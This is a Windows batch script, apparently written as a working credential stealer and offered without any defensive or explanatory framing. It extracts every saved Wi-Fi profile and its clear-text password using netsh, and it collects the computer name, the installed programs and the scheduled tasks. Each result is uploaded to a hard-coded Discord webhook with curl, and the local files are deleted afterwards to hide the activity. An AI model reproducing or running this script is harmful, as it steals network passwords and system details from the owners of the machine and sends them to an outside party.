@echo off 

set "webhook=https://discord.com/api/webhooks/959106863180414996/arlD-TscwYG_YxcDW0ORUdZhAd0mI5CXTAJBFSecbUBiZvJ-YD-LdLsTPHaxwtymVgiB" 
@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| find ":"') do (
    set "profileName=%%a"
    set "profileName=!profileName:~1!"
    for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!profileName!" key^=clear ^| find "Key Content"') do (
        set "password=%%b"
        set "password=!password:~1!"
        echo Wifi - !profileName! - !password! >> creds.txt
    )
)

type creds.txt

endlocal
curl --silent --output /dev/null -F b=@"creds.txt" %webhook% 
del creds.txt 
wmic product get name > installed_programs.txt
curl --silent --output /dev/null -F b=@"installed_programs.txt" %webhook%
del installed_programs.txt
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```%ComputerName% @ %TIME%```\"}" %webhook% 
schtasks > scheduled_tasks.txt
curl --silent --output /dev/null -F b=@"scheduled_tasks.txt" %webhook%
del scheduled_tasks.txt